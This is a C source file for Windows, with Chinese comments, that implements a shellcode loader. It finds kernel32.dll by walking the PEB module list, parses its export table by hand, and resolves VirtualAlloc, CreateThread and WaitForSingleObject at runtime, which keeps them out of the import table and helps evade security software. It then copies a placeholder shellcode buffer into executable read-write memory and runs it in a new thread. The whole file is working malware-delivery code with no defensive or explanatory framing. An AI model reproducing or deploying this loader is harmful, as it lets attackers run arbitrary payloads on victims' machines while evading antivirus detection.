#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef HMODULE(WINAPI* PGetModuleHandleA)(PCSTR);
typedef FARPROC(WINAPI* PGetProcAddress)(HMODULE, PCSTR);
typedef PVOID(WINAPI* PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef DWORD(WINAPI* PWaitForSingleObject)(HANDLE, DWORD);

void LocateKernel32() {
    //读取PEB地址
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
    PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
    PLIST_ENTRY listCurrent = listHead->Flink;
    PVOID kernel32Address = NULL;

    //遍历加载的模块
    do {
        PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
        PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
        WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
        CharUpperA(dllName);
        if (strstr(dllName, "KERNEL32.DLL")) {
            kernel32Address = dllEntry->DllBase;
            HeapFree(GetProcessHeap(), 0, dllName);
            break;
        }
        HeapFree(GetProcessHeap(), 0, dllName);
        listCurrent = listCurrent->Flink;
    } while (listCurrent != listHead);

    //解析导出目录
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32Address;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)kernel32Address + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32Address + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)kernel32Address + pExportDirectory->AddressOfNameOrdinals);

    //查找函数指针
    PGetModuleHandleA pGetModuleHandleA = NULL;
    PGetProcAddress pGetProcAddress = NULL;
    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i) {
        PCSTR pFunctionName = (PSTR)((PBYTE)kernel32Address + pAddressOfNames[i]);
        if (!strcmp(pFunctionName, "GetModuleHandleA")) {
            pGetModuleHandleA = (PGetModuleHandleA)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (!strcmp(pFunctionName, "GetProcAddress")) {
            pGetProcAddress = (PGetProcAddress)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }

    //动态解析其他必要函数
    HMODULE hKernel32 = pGetModuleHandleA("kernel32.dll");
    PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)pGetProcAddress(hKernel32, "VirtualAlloc");
    PCreateThread funcCreateThread = (PCreateThread)pGetProcAddress(hKernel32, "CreateThread");
    PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)pGetProcAddress(hKernel32, "WaitForSingleObject");

    //使用函数执行shellcode
    unsigned char shellcode[] = "[Shellcode]"; //嵌入Shellcode
    PVOID shellcode_exec = funcVirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcode_exec, shellcode, sizeof(shellcode));
    DWORD threadID;
    HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
    funcWaitForSingleObject(hThread, INFINITE);
}

int main() {
    LocateKernel32();
    return 0;
}
